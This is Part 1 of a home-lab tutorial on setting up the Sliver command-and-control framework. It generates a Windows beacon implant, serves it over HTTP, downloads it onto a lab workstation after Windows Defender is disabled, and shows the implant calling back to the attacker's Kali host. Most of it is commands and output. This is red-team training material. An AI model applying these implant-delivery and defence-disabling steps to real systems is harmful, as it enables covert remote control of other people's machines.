# Part 1 - Install of Sliver C2 on Kali VM, generate Beacon code, get call back from Windows target

## **Intro**
In this part, I will be using VMs from my **Active Directory Lab** available in my repo ["active-directoy"](https://github.com/jjkirn/active-directory) for this demo.

Here are some reference info from that lab:
- DC1: IP address = 192.168.175.155
- WS0: IP address = 192.168.175.123
- Kali: IP address = 192.168.175.130
- Management: IP address = 192.168.175.??? 

Using our Kali VM, will git clone the sliver repo, and compile it using go.

Using sliver, we will create a beacon implant (an .exe) and tranfer it to our lab target VM - WS0.

We discover that Windows Defender blocks us from both downloading the implant and running it.

We rely on a method from a John Hammond youtube video on how to disable all of Windows Defender to get our implant code to the target (A unrealistic scenario, but this is just a demo of sliver).

After making the Windows Defender disable changes to WS0, we now download the implant code and run it.

Back on Kali VM, we notice that we get a call back from the implant code showing our implant worked !

---
## **NOTE:**
[A Beginner's Guide to Sliver](https://notateamserver.xyz/sliver-101/) is available.

The guide explains the fundamentals of the framework and gives example commands.

It is highly recommeded that you read this intro before you go any further as I will not be explaining all of the features available.

I will only be showing some of the basics to get you up-and-running and key feature such as "Armory".

---
## **Getting Started**
Lets start with cloning the [sliver repo](https://github.com/BishopFox/sliver.git).

On Kali VM, open terminal window and do a git install of Sliver:
```
sudo su -
cd /opt
git clone https://github.com/BishopFox/sliver.git
exit
```

---
A requirement for installing Sliver from source is the go compiler, lets check if it is installed:
```
go version
```

If it is already installed, skip over the "go" install.

To install the "go" compiler:
```
sudo apt update && sudo apt full-upgrade -y
sudo apt install golang -y
go version
```

---
Time to install sliver c2.

Lets install sliver from source.

Make sure we are in the /opt/sliver directory:
```
sudo su -
# cd /opt/sliver
```

Run make to compile it and install:
```
# make
```
This will create "sliver-server" and "sliver-client" binaries.

Exit root:
```
exit
```

Lets get started by running the sliver server:
```
$ /opt/sliver/sliver-server
```

---
Lets start using Sliver by generating a beacon implant for a Windows x64 machine:
```
[server] sliver > generate  beacon --http 192.168.175.130/last/chance
...
[*] Implant saved to /home/jim/Desktop/GREAT_EXAMINATION.exe
```

We need to transfer the beacon "implant code" that was generated (GREAT_EXAMINATION.exe) to our Windows target (ws01).

The one of the easiest ways to transfer it to our Windows target is via http.

On Kali, cd to location of gernerated "implant code":
```
$ cd /home/jim/Desktop
```

Launch python web server at 8000:
```
python3 -m http.server
```

---
Switch to our Windows Target [WS01] and try to download the "implant code" from Kali:
```
PS C:> Invoke-WebRequest -Uri “http://192.168.175.130:8000/GREAT_EXAMINATION.exe” -OutFile "C:\Users\alice\Downloads\GREAT_EXAMINATION.exe"
```

It fails because Windows Defender intercepts it!

We need to disable all of Windows Defender including the realtime part.

You can follow the steps in a video from John Hammond - [PERMANENTLY TURN OFF Windows Defender on Windows 11](https://www.youtube.com/watch?v=81l__vvGnjA) to turn off all of "Windows Defender".

Complete all the steps from the video and reboot the Windows Workstation target [ws01].

You now should be able to download and run the implant on WS01:
```
PS C:> Invoke-WebRequest -Uri “http://192.168.175.130:8000/GREAT_EXAMINATION.exe” -OutFile "C:\Users\alice\Downloads\GREAT_EXAMINATION.exe"
```

Execute the implant - it should generate a callback to the the Kali sliver-server:
```			
PS C:> \GREAT_EXAMINATION.exe
```

---
Back on Kali VM, in the "sliver-server" terminal window, you should see the callback:
```
[server] sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #1

[server] sliver > beacons

 ID         Name                Transport   Hostname       Username    Operating System   Last Check-In   Next Check-In 
========== =================== =========== ============== =========== ================== =============== ===============
 a4ace178   GREAT_EXAMINATION   http(s)     DESKTOP-WS01   XYZ\alice   windows/amd64      13s             53s           
```

Great, this was one way to get sliver working, in part 2 I will show another way and an alternate way to bypass AV.

---
End of Part 1.